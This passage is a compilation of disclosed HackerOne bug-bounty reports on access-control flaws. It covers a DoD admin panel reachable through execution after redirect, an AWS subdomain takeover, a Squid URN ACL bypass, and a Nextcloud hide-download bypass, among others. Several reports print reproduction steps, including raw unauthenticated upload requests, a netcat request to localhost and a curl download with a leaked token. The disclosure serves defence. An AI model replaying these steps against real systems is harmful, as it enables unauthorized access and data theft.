				252.245-7000. Refer other requests to: Headquarters, ██████████, ATTN:
				Release Of ficer, ███████, ██████,
				█████. Destroy IAW DoDI 5030.59. Removal of this caveat is
				prohibited.</font></td>
	</tr>
</table>
--><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="50D6EE" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../███████/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            Welcome to ███  You are on World Wide Web<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">█████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../███/██████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../██████████/██████████/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../██████/██████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../██████████/█████/█████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../████████/██████/██████████bull.php">New ███</a></li>
										<li><a href="../██████████/█████████/███████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../██████/████████/██████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../████████/█████/██████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../███/██████████/█████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████/██████████/███████loadtxt.php" target="new">Install/Update
												█████████##.txt</a></li>
										<li><a href="../███████/███████/███████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../██████/█████████/██████mod.php">Modify ██████████ Chart</a></li>
										<li><a href="../██████████/███████/█████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../████████/███/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../█████/███/█████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../███████/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../████/█████/████████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../████/█████/█████_documentation.php">████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete █████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://█████/██████/████/█████████bull.php. Note that the request has no session cookie:

```
POST /████/███████/███████bulla.php HTTP/1.1
Host: █████
Content-Length: 401
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://███████/█████/████/████████bull.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
X-Bug-Bounty: HackerOne-palaziv
X-Bug-Bounty: BurpSuitePro

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="bdate"

1970-01-01
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="userfile1"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryVxWfTBx5ZkXMXVG2
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--
```

Response:

```
HTTP/1.1 302 Found
Date: Wed, 10 Nov 2021 14:44:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: ../../█████████/404.html
Pragma: no-cache
Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly
Set-Cookie: ███; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.█████████
Content-Length: 173

<br>Upload SUCCESS!<br>S3 ObjectURL: https://pcf-om-mil-86e7ccdd-b099-4b50-aad2-cad52466327b.s3.amazonaws.com/██████████/███████SiteContent/█████████████.zip<br>error in █████ table 
```

This uploaded file can be downloaded again on https://█████████.██████████/████/███/███.php (another system) by clicking on the "██████████ ███████" link: https://██████.█████████/█████████/██████████/downloadS3File.php?file=███%2F██████SiteContent%2F███████.zip

## Suggested Mitigation/Remediation Actions
Implement proper access controls.

Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.

---

### [Unauthenticated Access to Admin Panel Functions at https://██████████/████████](https://hackerone.com/reports/1394910)

- **Report ID:** `1394910`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @palaziv
- **Bounty:** - usd
- **Disclosed:** 2021-11-29T22:11:25.600Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
I discovered that the admin panel at https://████/█████ and all its functions can be accessed without authentication.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
████████

## Affected Product(s) and Version(s)
██████'s ████████ (███) Management

## CVE Numbers


## Steps to Reproduce
* Navigate to https://█████/ and click on the "█████████" button
* Notice how the application first sends an HTTP POST request to https://█████████/█████ which gets answered with a redirect to https://█████/█████ which again redirects to https://███████/█████████
* Looking at the response to https://█████████/███████ I noticed that even though the server sent back a 302 status code with a header `Location: /█████` the response was quite long
* I browsed to https://████████/████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ███ Admin Functions:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 20:28:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /███████
Pragma: no-cache
X-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 4260


<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF" ;="" align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167
				130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48
				C.F.R. &#167 252.245-7000. <br>Refer other requests to:
				Headquarters, █████████, ATTN: Release Officer, █████████
				████████. <br>Destroy IAW DoDD 5030.59.
				Removal of this caveat is prohibited.
		</font></td>
	</tr>
</table>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████p/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████████p/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="#82F379" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../██████p/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            ████ You are on NIPR NET RESTRICTIVE<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">███████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../████p/████████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../████p/███/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../████p/████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../███████p/████████/████████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../██████████p/██████/███████████████">New █████</a></li>
										<li><a href="../████p/████/██████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../███p/██████/████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../███p/█████/██████████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../█████p/█████/████████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████p/███/█████████loadtxt.php" target="new">Install/Update
												██████##.txt</a></li>
										<li><a href="../█████p/██████████/████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../████████p/█████████/███mod.php">Modify ██████ Chart</a></li>
										<li><a href="../████p/██████████/██████████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../███p/██████████/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../███p/██████/██████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../█████████p/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../██████████p/███/█████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../█████████p/█████/████████_documentation.php">██████████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete ████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://███/elist/s3html.php. Note that the request has no session cookie:

```
POST /██████████ HTTP/1.1
Host: ███
Content-Length: 899
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://██████████/elist/s3html.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="oNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="update"

2021-11-08
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nxtdate"

2021-12-06
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="regionSelect"

01
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="type"

windows
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="userfile1[]"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryT4r0MDX8IcQqr8D9--

```

Response:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 21:03:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: 404.html
Pragma: no-cache
Set-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly
Set-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/
Content-Length: 337

<br> path is /███████<br> get outtest.txt<br>S3 keyname: ██████████p/█████████test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://███████/████p/███████████████test.txt<br>error in ██████charts table 
```

## Suggested Mitigation/Remediation Actions
Implement proper access controls.

Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.

---

### [AWS subdomain takeover of www.███████](https://hackerone.com/reports/1329792)

- **Report ID:** `1329792`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @al-madjus
- **Bounty:** - usd
- **Disclosed:** 2021-10-28T20:18:39.302Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
The AWS bucket hosted on `www.████████` was vulnerable to a subdomain takeover. It has a DNS record pointing to an unclaimed bucket that I was able to register and serve a PoC on. 

## References
Output of `dig`:
```
;; QUESTION SECTION:
;www.███████.		IN	A

;; ANSWER SECTION:
www.████.	1833	IN	CNAME	██████████.
███. 60 IN	A	███████
█████. 60 IN	A	███
█████████. 60 IN	A	████████
█████. 60 IN	A	███

;; AUTHORITY SECTION:
█████. 1831 IN	NS	████.
███. 1831 IN	NS	█████████.
███████. 1831 IN	NS	██████.
██████. 1831 IN	NS	██████████.

;; ADDITIONAL SECTION:
█████████.	151098	IN	A	████
████.	153636	IN	A	████████
█████.	132552	IN	A	█████
███████. 6009	IN	A	███
████.	56631	IN	AAAA	███

```

## Impact

The impact for a subdomain takeover can be varied and wide: potentially steal cookies, bypass CSP and CORS policies, bypass domain whitelisting for SSRF, spy on legitimate requests sent to that domain, phising vector, etc.

## System Host(s)
www.█████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to https://www.███████/█████████████████ which is the PoC I have hosted.

## Suggested Mitigation/Remediation Actions
Please remove all dangling DNS records if they are not needed, or claim the buckets if they are.

---

### [Misuse of groups feature allows workspace members to join private channels without being invited](https://hackerone.com/reports/1248852)

- **Report ID:** `1248852`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Slack
- **Reporter:** @kmap
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T20:08:20.299Z
- **CVE(s):** -

**Summary (team):**

@kmap alerted us to an issue that would have allowed workspace members to join private channels through misuse of our User Groups feature. The bug was fixed on the next day, and Slack notified the few customers with users matching the conditions in the report.
Many thanks to @kmap for reporting this!

---

### [Access to microtransaction sales data for lots of apps from 2014 to present at /valvefinance/sanity/](https://hackerone.com/reports/975212)

- **Report ID:** `975212`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2021-09-21T21:41:56.590Z
- **CVE(s):** -

**Summary (team):**

The Steamworks Product Data web site had an URL route with insufficient access controls, which would allow an authenticated partner to view data for games which they might not otherwise have permissions to view. After mitigation, an audit of accesses to this URL route showed no accesses by parties other than Valve or the reporter of this issue.

---

### [Access to alerta.khanacademy.org leak sensitive data ](https://hackerone.com/reports/1061664)

- **Report ID:** `1061664`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Khan Academy
- **Reporter:** @myominthu_sec
- **Bounty:** - usd
- **Disclosed:** 2021-09-08T08:36:43.777Z
- **CVE(s):** -

**Vulnerability Information:**

Hi ,
I found to access https://alerta.khanacademy.org/ using signup bypass.That leak access to sensitive data of khanacademy.org

Step To Reproduce:

1. Go to https://alerta.khanacademy.org/#/signup
2. Inspect Q and remove ng-hide

{F1121291}

3. You got Signup Form. Signup account using anythings@khanacademy.org mail.

{F1121292}

4. When you successfully signup,You access alerta.khanacademy.org without confirm email.

{F1121297}

If you not login direct .
1. Go to alerta.khanacademy.org/#/login.
2. Inspect Q and remove ng-hide

{F1121293}

3. Login with your register info.

{F1121294}

## Impact

Attacker can access alerta dashboard

Thanks,
@nightmare_msf

---

### [URN Request bypass ACL Checks](https://hackerone.com/reports/824802)

- **Report ID:** `824802`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @jeriko_one
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:32:28.453Z
- **CVE(s):** CVE-2019-12523

**Vulnerability Information:**

## Summary:
Attacker can bypass ACL checks gaining access to restricted HTTP servers such as those running on localhost. Attacker could also gain access to CacheManager if VIA
header is turned off. Only lines with : will be readable though, and the response must be less than 4096 bytes or it'll trigger the Heap Overflow I reported earlier. 

This is due to URN request being transformed into HTTP request, and not going through the ACL checks that incoming HTTP request go through. 

<= Squid-4.8 Vulnerable
Fixed in Squid-4.9
Squid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_8.txt
Assigned  CVE-2019-12523 

## Steps To Reproduce:
Enable URN by adding the following entry to Safe_ports
```
acl Safe_ports port 0           # urn
```

Ensure that you're blocking request to localhost
```
http_access deny to_localhost
```
1) Start Squid
```
./sbin/squid 
```

2) Start a HTTP server on localhost serving a file that has colons
```
python -m http.server --bind 127.0.0.1 8080
```
Contents of hello.html
```
<html>
	<body>
	Notice: For localhost only
	</body>
</html>
```

3) Make the following URN request

```
echo -e "GET urn::@127.0.0.1:8080/hello.html? HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

HTTP/1.1 302 Found
Server: squid/4.8
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 18:11:20 GMT
Content-Type: text/html
Content-Length: 460
Expires: Thu, 19 Mar 2020 18:11:20 GMT
Location: 	Notice: For localhost only
X-Cache: MISS from g64
Via: 1.1 g64 (squid/4.8)
Connection: keep-alive

<TITLE>Select URL for urn::@127.0.0.1:8080/hello.html?</TITLE>
<STYLE type="text/css"><!--BODY{background-color:#ffffff;font-family:verdana,sans-serif}--></STYLE>
<H2>Select URL for urn::@127.0.0.1:8080/hello.html?</H2>
<TABLE BORDER="0" WIDTH="100%">
<TR><TD><A HREF="	Notice: For localhost only">	Notice: For localhost only</A></TD><TD align="right">Unknown</TD><TD> </TD></TR>
</TABLE><HR noshade size="1px">
<ADDRESS>
Generated by squid/4.8@g64
</ADDRESS>

```

## Analysis
URN Request are different than other request coming into Squid. The original
URN request is hardly parsed from Anyp::Uri::parse only setting a scheme and path.

AnyP::Uri::parse
    } else if (strncmp(url, "urn:", 4) == 0) {
        debugs(23, 3, "Split URI '" << url << "' into proto='urn', path='" << (url+4) << "'");
        debugs(50, 5, "urn=" << (url+4));
        setScheme(AnyP::PROTO_URN, nullptr);
        path(url + 4);
        return true;
Once it's reached FwdState::Start it arrives in it's own URN code. The original
URN request is then transformed into a new HTTP request.

UrnState::setUriResFromRequest
    char *host = getHost(uri);
    snprintf(local_urlres, 4096, "http://%s/uri-res/N2L?urn:" SQUIDSBUFPH, host, SQUIDSBUFPRINT(uri));
    safe_free(host);
    safe_free(urlres);
    urlres_r = HttpRequest::FromUrl(local_urlres, r->masterXaction);

This new HTTP Request is sent directly to FwdState::Start without going
through doCallouts or clientAccessChecks

UrnState::created
	FwdState::Start(Comm::ConnectionPointer(), urlres_e,urlres_r.getRaw(), ale);

This allows a user to reach HTTP servers that were meant to
be blocked by Squid, e.g. localhost.

http://:@127.0.0.1:7331/PATH?/uri-res/N2L?urn::@127.0.0.1:7331/PATH?

Squid won't be able to callback into itself to access things like Cache
Manager since the VIA header will be set. If a Squid server was configured to
not send the Via header then this would give a user access to it.
Here's a blog post that recommends removing VIA header to remove all Proxy
headers https://adamscheller.com/systems-administration/remove-proxy-headers-squid/

If via is off a user could send a request such as below to gain access
GET urn::@localhost:3128/squid-internal-mgr/active_requests? HTTP/1.1

Below is the CacheManager getting accessed via this:
Breakpoint 2, CacheManager::start (this=0x603000000e80, client=..., request=0x61c00001f880, entry=0x60c00001ff00, ale=...) at cache_manager.cc:307
(gdb) p request->url->absolute_->store_.p_->mem
$25 = 0x62900000f200 "http://g64:3128/squid-internal-mgr/active_requests?/uri-res/N2L?urn::@localhost:3128/squid-internal-mgr/active_requests?

A user abusing this won't see the full response, since URN handles URLs and
looks for :. Therefore they would only see lines containing :

Also the current state of URN it's more likely that Squid would crash due to
overflows than show the user any data. Once that is fixed this becomes a more
reasonable way to leak internal responses.

## Impact

Attacker can bypass all ACLs using an URN Request. This allows them to make HTTP GET Request to restricted resources. An attacker will be limited on what they can view from these request. Lines must contain : and the response must be less than 4096 bytes.

---

### [Client IP Spoofing using "X-Forwarded-For: 127.0.0.1" on "studio-app.snapchat.com" exposing bucket details](https://hackerone.com/reports/382678)

- **Report ID:** `382678`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Snapchat
- **Reporter:** @damian89
- **Bounty:** 500 usd
- **Disclosed:** 2021-08-12T21:33:50.995Z
- **CVE(s):** -

**Summary (team):**

Researcher's summary is accurate. An attacker could view a variety of non-sensitive service config information by setting the `X-Forwarded-For: 127.0.0.1` header on a specific service path.

**Summary (researcher):**

By adding "X-Forwarded-For: 127.0.0.1" as a header while requesting a certain path on a certain snapchat resource, an attacker was able to (non-sensitive) details about the underlying system/bucket.

---

### [Virtual Data Room / Hide download on collabora is easy to bypass](https://hackerone.com/reports/1194606)

- **Report ID:** `1194606`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Nextcloud
- **Reporter:** @rtod
- **Bounty:** 150 usd
- **Disclosed:** 2021-08-07T14:28:34.326Z
- **CVE(s):** CVE-2021-32748

**Vulnerability Information:**

So, let me start with saying I'm not sure if this is a security issue or if it is by design. The reason I'm reporting it here is since Nextcloud promotes this Virtual Data Room a lot.

https://nextcloud.com/blog/nextcloud-announces-virtual-data-room-solution-for-ultimate-protection-of-data-during-sensitive-dealmaking/
https://nextcloud.com/virtual-data-room/

And let me just quote: "configure Secure View ensure the users can still read and (when shared with editing rights) modify documents, while the documents are watermarked when on screen."

"With secure view, our online office solutions can be configured to open PDF files, images and text files, making these files available in a watermark-protected way, while downloads and other apps are disabled using File Access Control. This setup is useful when data has to be protected from leaking but still has to be made available for review, as in a virtual data room scenario."

Both of these claims are false. 

Minimal proof of concept.

1. Setup Nextcloud with Collabora
2. Setup sercure view & file access control to disallow the download of the files
3. Share a document, lets say `vdr.odt` by public link and mark as hide download
4. Copy the link

Now the point here is that anybody you send the link will only see the watermarked file. Not being able to download or copy data. And of course making a picture of these things is useless as it shows the watermark.

5. attacker opens their network tab in the developer tools
6. attacker opens the link
7. attacker filters on WOPISRC
8. Attacker finds a link like

```
wss://collabora.server/https%3A%2F%2Fserver%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F1234_abcd%3Faccess_token%3efgh%26access_token_ttl%3D0/ws?WOPISrc=https%3A%2F%2Fserver%2Findex.php%2Fapps%2Frichdocuments%2Fwopi%2Ffiles%2F1234_abcd&compat=/ws
```

As far as I understand the WOPI spec this is us sending the collabora server the WOPI endpoint they have to call. Which in this case is

`https://server/index.php/apps/richdocument/wopi/files/1234_abcd`
The `1234_abcd` seems to be the `fileid` and the `instance id`

And the access token is also there in the url. In this case `efgh`.

Now if an attacker just does the following curl command

```
curl https://server/index.php/apps/richdocument/wopi/files/1234_abcd?access_token=efgh -o stolen.odt
```

You will see that they have the unwatermarked version of the data. This is even easier than copying everything over or making photographs.

## Impact

Your Virtual Data Room is inherently broken. And the claims you make on your website are at best misleading.
However as said I'm not sure if this may be intentional as the feature is called hide download in the UI.

In any case. Maybe a good idea would be to have a secret configured on both collabora and the Nextcloud host. Which gets send. So that in case of hide download a client that doesn't know the secret token can't download the file.

I do not have access to a setup with Only Office. But I believe that to be vulnerable to a similar attack.

---

### [Improper authorization on `/api/as/v1/credentials/` for  Dev Role User with Limited Engine Access](https://hackerone.com/reports/1218680)

- **Report ID:** `1218680`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Elastic
- **Reporter:** @superman85
- **Bounty:** - usd
- **Disclosed:** 2021-08-03T17:12:41.321Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Dear Team,

Since  #1168528 was resolved. I have checking again for other roles. At Dev Role with Limited Engine Access, an user still can access API endpoint 
`/api/as/v1/credentials/` to get all API keys (private-key, search-key ... )

## Steps To Reproduce:

1 - Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
2 - Choose an username , password and role for this user. For example you can choose username: **dev**
3 - Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
4 - Click Add mapping
5 - External Attribute choose **username** , in the Attribute value field enter **dev**
6 - In the Role box select Dev
7 - In Engine Access select Limited Engine Access, no need to select any engine
8 - Login to App Search with user **dev**
9 - Go to endpoint https://your_app_search_instance/api/as/v1/credentials/
10 - You still can get all api keys 

I have attached video PoC
█████████

## Impact

Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.

With Limited Engine Acess, an user should create and managed their own api keys

---

### [Publicly accessible Continuous Integration Tool](https://hackerone.com/reports/313457)

- **Report ID:** `313457`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** Snapchat
- **Reporter:** @stgstate
- **Bounty:** - usd
- **Disclosed:** 2021-07-29T22:36:19.064Z
- **CVE(s):** -

**Summary (team):**

@apfeifer27 found an internal Continuous-Integration instance, which disclosed internal source code and credentials for some of our instances.

---

### [Enumerate all the class codes via google dorking ](https://hackerone.com/reports/1210043)

- **Report ID:** `1210043`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Khan Academy
- **Reporter:** @renganathan
- **Bounty:** - usd
- **Disclosed:** 2021-07-22T01:44:36.165Z
- **CVE(s):** -

**Vulnerability Information:**

I used this particular google dork `site:khanacademy.org/join/*` to enumerate all the links of joining classes. 

1. Go to google and use the above query to enumerate all of them. 
2. Create the student account by filling all the required details 
3. Now you're in the class without being actually invited by the teacher 

Attached POC:
████████

## Impact

An attacker can enumerate all the classes and join in them and make chaos there are chances of IDOR too... a class code can look like `a57d5d5548f302ef4a` instead of `A45JST`

---

### [Broken Authentication and Session Management lead to take over account](https://hackerone.com/reports/1271710)

- **Report ID:** `1271710`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Phabricator
- **Reporter:** @thund3r17
- **Bounty:** - usd
- **Disclosed:** 2021-07-21T16:32:52.928Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, 
I found vulnerability using phone

Summary : 
Session token weakness, allowing attackers to take over accounts

Tools :
Lightning.apk (Browser) 
SandroProxy.apk or you can use all available proxies

Steps to Reproduce:
1) Create a phacility account.
2) Go to https://admin.phacility.com/settings/user/(username)/page/email/
3) Add new account
4) Open SandroProxy (Capture all http request) the request should look like this:

POST /settings/user/(username)/page/email/ HTTP/1.1
Host: admin.phacility.com
Connection: keep-alive
Content-Length: 157
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
X-Phabricator-Csrf: B@5xu5frjn4f5238616917563d
sec-ch-ua-mobile: ?1
User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36
X-Phabricator-Via: /settings/user/(username)/page/email/
